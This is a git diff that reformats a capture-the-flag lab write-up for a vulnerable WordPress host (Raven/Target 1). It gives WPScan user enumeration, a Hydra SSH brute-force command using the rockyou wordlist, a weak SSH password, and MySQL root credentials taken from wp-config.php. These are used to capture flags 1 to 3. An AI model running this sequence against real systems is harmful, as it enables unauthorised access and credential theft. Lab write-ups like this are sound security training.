@@ -57,32 +57,34 @@ The Red Team was able to penetrate Target 1 and retrieve the following confident
 flag1.txt: {b9bbcb33e11b80be759c4e844862482d}
 
 * Exploit Used:
-
 * WPScan to enumerate users on the Target1 WordPress site.
-
 * Command: $ wpscan --url 192.168.1.110/wordpress $ wpscan --url 192.168.1.110 --enumerate -u
   
 <img width="423" alt="image (4)" src="https://user-images.githubusercontent.com/100730516/186098760-1bcb8389-9ad7-4651-8727-3cea05fc3b88.png">
 
 Targeting the user michael
-
+  
 Small manual Brute Force attack to guess/finds Michael's password.
-
+  
 First, the user's password is weak and obvious.
-
+  
 Second, for pratice, Hydra can be used to crack Michaels's password:
-
+  
 Command: hydra -l michael -P /usr/share/wordlists/rockyou.txt -vV 192.168.1.110 -t 4 ssh
 
 
 Capturing Flag1: SSH in as Michael, transvering through directories and files.
+
 The first Flag was found in /var/www/html folder at root in services.html in a HTML comment below the footer.
+
 Commands:
 ssh michael@192.168.1.110
+
 password: michael
-cd /var/www/html
-ls -l
-nano services.html
+
+  * cd /var/www/html
+  * ls -l
+  * nano services.html
   
 <img width="415" alt="image (7)" src="https://user-images.githubusercontent.com/100730516/186099164-3747f922-2d8d-493c-97f8-1cc4501a71dc.png">
 
@@ -93,18 +95,22 @@ flag2.txt: {fc3fd5Bdcdad9ab23facac6e9a365e581c33}
 Exploit Used
 
 The same exploit used to gain flag1.
+
 Capturing Flag2: While in SSH in as Michael, Flag2 was also gained.
+
 Once again, browsing through the files and directories, Flag2 can be found in /var/www next to the html folder where Flag1 was found.
-Commands:
+
+* Commands:
 ssh michael@192.168.1.110
-password: michael
-cd /var/www
-ls -l
-cat flag2.txt
+
+* password: michael
+  * cd /var/www
+  * ls -l
+  * cat flag2.txt
 
 flag3.txt: {afc01ab56b50591e7dccf93122770cd23}
 
-Exploit Used:
+<b>Exploit Used:<b>
   
  <img width="322" alt="image (8)" src="https://user-images.githubusercontent.com/100730516/186099494-a2aff39e-bc96-4e0b-a09e-ec15d8efa00d.png"> 
   
@@ -112,13 +118,16 @@ Exploit Used:
 
 
 Same exploits to gain Flag1 and Flag2.
+
 Capturing Flag3: Access the MYSQL database.
+
 Discovering the wp-config.php and gaining access to the database credentials as the user Michael, MYSQL when used to explore the database.
-Commands:
-mysql -u root -p 'R@v3nSecurity'
-show databases;
-use wordpress;
-select * from wp_posts;
+
+* Commands:
+  * mysql -u root -p 'R@v3nSecurity'
+  * show databases;
+  * use wordpress;
+  * select * from wp_posts;
 
 
 flag4.txt: {715dea6c055b9fe3337544932F2941ce}
